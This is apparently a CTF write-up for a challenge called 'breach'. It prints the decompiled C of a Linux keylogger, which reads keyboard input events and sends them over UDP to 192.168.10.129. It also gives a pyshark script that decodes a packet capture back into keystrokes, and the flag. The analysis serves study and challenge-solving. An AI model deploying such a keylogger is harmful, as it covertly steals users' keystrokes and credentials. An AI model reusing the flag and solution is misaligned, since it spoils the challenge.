---
created: 2025-03-01T17:59
updated: 2025-03-18T02:26
solves: 11
points: 300
---

`breach` is a virus that sends keystrokes over UDP it seems.

The linux key event structure is as follows, the virus is sending bytes 16 to 21, which is `type|code|val` where `value` is cut.

```c
struct input_event {
	struct timeval time; = {long seconds, long microseconds}
	unsigned short type;
	unsigned short code;
	unsigned int value;
};
```

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3; // [rsp+7h] [rbp-C9h] BYREF
  int i; // [rsp+8h] [rbp-C8h]
  int v5; // [rsp+Ch] [rbp-C4h]
  int fd; // [rsp+10h] [rbp-C0h]
  int v7; // [rsp+14h] [rbp-BCh]
  char *src; // [rsp+18h] [rbp-B8h]
  struct sockaddr addr; // [rsp+20h] [rbp-B0h] BYREF
  char dest[12]; // [rsp+30h] [rbp-A0h] BYREF
  int v11; // [rsp+3Ch] [rbp-94h]
  __int16 v12; // [rsp+40h] [rbp-90h]
  char v13; // [rsp+42h] [rbp-8Eh]
  char buf[32]; // [rsp+50h] [rbp-80h] BYREF
  char v15[88]; // [rsp+70h] [rbp-60h] BYREF
  unsigned __int64 v16; // [rsp+C8h] [rbp-8h]

  v16 = __readfsqword(0x28u);
  strcpy(v15, "cat /proc/bus/input/devices | grep keyboard -A 5 | grep -o -E  'event[0-9]+'");
  src = (char *)execute_command(v15, argv);
  strcpy(dest, "/dev/input/");
  v11 = 0;
  v12 = 0;
  v13 = 0;
  strcat(dest, src);
  v5 = strcspn(dest, "\n");
  dest[v5] = 0;
  fd = open(dest, 0);
  if ( fd < 0 )
  {
    perror("Error opening file");
    exit(1);
  }
  free(src);
  v7 = socket(2, 2, 0);
  if ( v7 < 0 )
  {
    perror("Error creating socket");
    exit(1);
  }
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = inet_addr("192.168.10.129");
  *(_WORD *)addr.sa_data = htons(0x539u);
  while ( read(fd, buf, 0x18uLL) == 24 )
  {
    for ( i = 16; i <= 21; ++i )
    {
      v3 = buf[i];
      if ( sendto(v7, &v3, 1uLL, 0, &addr, 0x10u) < 0 )
      {
        perror("Error sending data");
        exit(1);
      }
    }
  }
  perror("Error reading from file");
  exit(1);
}
```

## solve

Just solve it.

```python
import struct
import pyshark

KEY_MAPPING = {
    2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
    12: '-', 13: '=', 14: 'BACKSPACE', 15: 'TAB', 16: 'q', 17: 'w', 18: 'e', 19: 'r',
    20: 't', 21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p', 26: '[', 27: ']', 28: 'ENTER',
    29: 'CTRL', 30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g', 35: 'h', 36: 'j', 37: 'k',
    38: 'l', 39: ';', 40: "'", 41: '`', 42: 'SHIFT', 43: '\\', 44: 'z', 45: 'x', 46: 'c',
    47: 'v', 48: 'b', 49: 'n', 50: 'm', 51: ',', 52: '.', 53: '/', 54: 'RSHIFT',
    55: '*', 56: 'ALT', 57: ' ', 58: 'CAPS', 59: 'F1', 60: 'F2', 61: 'F3',
    62: 'F4', 63: 'F5', 64: 'F6', 65: 'F7', 66: 'F8', 67: 'F9', 68: 'F10',
}
SHIFT_KEY_MAPPING = {
    '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
    '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
    '`': '~'
}


def decode_keystrokes(pcap_file):
    cap = pyshark.FileCapture(pcap_file, display_filter=f'udp.stream eq 0')
    all_data = b''
    for packet in cap:
        try:
            if hasattr(packet, 'udp') and hasattr(packet, 'data'):
                data_hex = packet.data.data
                all_data += bytes.fromhex(data_hex.replace(':', ''))
        except AttributeError:
            continue
    cap.close()
    return all_data


""" [16:22]
struct timeval time; = {long seconds, long microseconds} 16
unsigned short type; 
unsigned short code;
unsigned int value;
"""
EV_KEY = 1
EV_MSC = 4
EV_SYN = 0

keystrokes = decode_keystrokes("capture.pcapng")
shift = False
caps = False
for i in range(0, len(keystrokes), 6):
	chunk = keystrokes[i:i + 6]
	t, code, v = struct.unpack('HHH', chunk)
	# print(f't: {t}, code: {code}, v: {v}')
	if t == EV_KEY:
		if code in KEY_MAPPING:
			key = KEY_MAPPING[code]
			if v:  # pressed
				if key == 'SHIFT':
					shift = True
				elif key == 'CAPS':
					caps = not caps
				else:
					if shift ^ caps:
						key = SHIFT_KEY_MAPPING.get(key, key.upper())
						shift = False
					print(key, end='')
		else:
			print(f'Unknown key: {code}')
```

```flag
ATHACKCTF{Y0u_533_h0w_L1NUX_h4NdL3_Input$}
```
